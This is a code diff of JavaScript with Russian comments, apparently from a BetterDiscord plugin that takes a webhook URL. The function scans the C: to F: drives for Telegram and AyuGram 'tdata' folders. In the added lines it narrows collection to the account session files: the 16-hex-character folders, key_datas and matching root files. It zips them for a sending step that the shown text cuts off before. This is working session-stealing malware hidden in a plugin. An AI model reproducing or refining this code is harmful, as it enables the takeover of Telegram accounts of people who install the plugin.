@@ -59,7 +59,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) { result.debug_tdata.push("Ошибка серверов: " + e.message); }
 
-    // 4. УМНЫЙ ПОИСК tdata (по путям и по .exe)
+    // 4. ПОИСК tdata
     let hasTdata = false;
     let tdataPath = null;
     
@@ -68,7 +68,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         const localAppData = process.env.LOCALAPPDATA || '';
         const userProfile = process.env.USERPROFILE || '';
         
-        // Сначала проверяем стандартные пути
         const standardPaths = [
             'D:\\zapret\\Ayugram\\tdata',
             'D:\\zapret\\AyuGram\\tdata',
@@ -99,24 +98,18 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             const drives = ['C:', 'D:', 'E:', 'F:'];
             
             const findTdataRecursive = (dir, depth = 0) => {
-                if (depth > 4) return null; // Ограничение глубины 4 уровнями
-
+                if (depth > 4) return null;
                 try {
                     const entries = fs.readdirSync(dir, { withFileTypes: true });
-                    
                     let localTdataPath = null;
 
-                    // Проверяем текущую папку
                     for (const entry of entries) {
                         const lowerName = entry.name.toLowerCase();
-                        // Если нашли папку tdata
                         if (entry.isDirectory() && lowerName === 'tdata') {
                             localTdataPath = path.join(dir, entry.name);
                         }
-                        // Если нашли .exe телеграма
                         if (entry.isFile() && lowerName.endsWith('.exe')) {
                             if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg.exe') {
-                                // Проверяем, есть ли tdata рядом с exe
                                 const possibleTdata = path.join(dir, 'tdata');
                                 if (fs.existsSync(possibleTdata) && fs.statSync(possibleTdata).isDirectory()) {
                                     localTdataPath = possibleTdata;
@@ -125,25 +118,20 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                         }
                     }
 
-                    // Если нашли в этой папке, возвращаем
                     if (localTdataPath) {
                         result.debug_tdata.push(`Найдено при сканировании: ${localTdataPath}`);
                         return localTdataPath;
                     }
 
-                    // Если не нашли, идем глубже
                     const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
-                    
                     for (const entry of entries) {
                         if (entry.isDirectory()) {
                             const lowerName = entry.name.toLowerCase();
                             if (ignoreDirs.includes(lowerName) || lowerName.startsWith('.')) continue;
-                            
                             const fullPath = path.join(dir, entry.name);
                             
-                            // Если это папка с названием telegram/ayugram, заходим без ограничения глубины (но не больше 6)
                             if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg') {
-                                const res = findTdataRecursive(fullPath, depth); // depth не увеличиваем, чтобы заглянуть глубже
+                                const res = findTdataRecursive(fullPath, depth);
                                 if (res) return res;
                             } else {
                                 const res = findTdataRecursive(fullPath, depth + 1);
@@ -151,9 +139,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                             }
                         }
                     }
-                } catch (e) {
-                    // Игнорируем ошибки доступа
-                }
+                } catch (e) {}
                 return null;
             };
 
@@ -170,63 +156,86 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
     }
 
-    // 5. ФОРМИРУЕМ АРХИВ
+    // 5. ФОРМИРУЕМ АРХИВ (ТОЛЬКО НУЖНЫЕ ФАЙЛЫ)
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
-        const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
-        zipFiles['data.json'] = jsonBytes;
 
         if (tdataPath) {
             result.telegram_path = tdataPath;
             result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
             
-            let totalSize = 0;
-            const checkSize = (dir) => {
-                try {
-                    const entries = fs.readdirSync(dir);
-                    for (const entry of entries) {
-                        const fullPath = path.join(dir, entry);
-                        if (fs.statSync(fullPath).isDirectory()) checkSize(fullPath);
-                        else totalSize += fs.statSync(fullPath).size;
-                    }
-                } catch(e) {}
-            };
-            checkSize(tdataPath);
+            // Регулярное выражение для поиска 16-символьных HEX-папок и файлов
+            const hexRegexFolder = /^[A-Fa-f0-9]{16}$/;
+            const hexRegexFile = /^[A-Fa-f0-9]{16}[a-z]?$/;
 
-            if (totalSize > 20 * 1024 * 1024) {
-                result.debug_tdata.push("Папка >20MB. Пропуск.");
-            } else {
+            try {
+                const entries = fs.readdirSync(tdataPath, { withFileTypes: true });
                 let fileCount = 0;
-                const addFilesRecursively = (dir, prefix = '') => {
-                    try {
-                        const entries = fs.readdirSync(dir);
-                        for (const entry of entries) {
-                            const fullPath = path.join(dir, entry);
-                            const relativePath = (prefix ? prefix + '/' : '') + entry;
+
+                for (const entry of entries) {
+                    const name = entry.name;
+                    const fullPath = path.join(tdataPath, name);
+
+                    // 1. Ищем папку с 16-символьным названием
+                    if (entry.isDirectory() && hexRegexFolder.test(name)) {
+                        result.debug_tdata.push(`Добавлена папка аккаунта: ${name}`);
+                        
+                        const addFolder = (dir, prefix = '') => {
                             try {
-                                if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
-                                else {
-                                    zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
-                                    fileCount++;
+                                const subEntries = fs.readdirSync(dir);
+                                for (const sub of subEntries) {
+                                    const subFull = path.join(dir, sub);
+                                    const relPath = (prefix ? prefix + '/' : '') + sub;
+                                    if (fs.statSync(subFull).isDirectory()) {
+                                        addFolder(subFull, relPath);
+                                    } else {
+                                        zipFiles['tdata/' + name + '/' + relPath] = new Uint8Array(fs.readFileSync(subFull));
+                                        fileCount++;
+                                    }
                                 }
-                            } catch (fileErr) { }
-                        }
-                    } catch (dirErr) { }
-                };
-                addFilesRecursively(tdataPath);
-                result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
-                hasTdata = true;
+                            } catch (err) {
+                                result.debug_tdata.push(`Ошибка чтения папки ${name}: ${err.message}`);
+                            }
+                        };
+                        addFolder(fullPath);
+                    }
+                    
+                    // 2. Ищем key_datas
+                    else if (entry.isFile() && name === 'key_datas') {
+                        zipFiles['tdata/key_datas'] = new Uint8Array(fs.readFileSync(fullPath));
+                        result.debug_tdata.push(`Добавлен файл: key_datas`);
+                        fileCount++;
+                    }
+
+                    // 3. Ищем корневые файлы с 16-символьным названием (например, D877F783D5D3EF8C или D877F783D5D3EF8Cs)
+                    else if (entry.isFile() && hexRegexFile.test(name)) {
+                        zipFiles['tdata/' + name] = new Uint8Array(fs.readFileSync(fullPath));
+                        result.debug_tdata.push(`Добавлен файл: ${name}`);
+                        fileCount++;
+                    }
+                }
+                
+                result.debug_tdata.push(`Итого добавлено файлов: ${fileCount}`);
+                if (fileCount > 0) hasTdata = true;
+                
+            } catch (dirErr) {
+                result.debug_tdata.push(`Ошибка чтения tdata: ${dirErr.message}`);
             }
         } else {
             result.debug_tdata.push("Папка tdata не найдена.");
         }
 
+        // Создаем data.json
+        const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
+        zipFiles['data.json'] = jsonBytes;
+
+        // Создаем ZIP
         finalZipBuffer = zipFunc(zipFiles);
         result.debug_tdata.push("ZIP успешно создан!");
 
     } catch (e) {
-        result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
+        result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
     }
 
     // 6. ОТПРАВКА
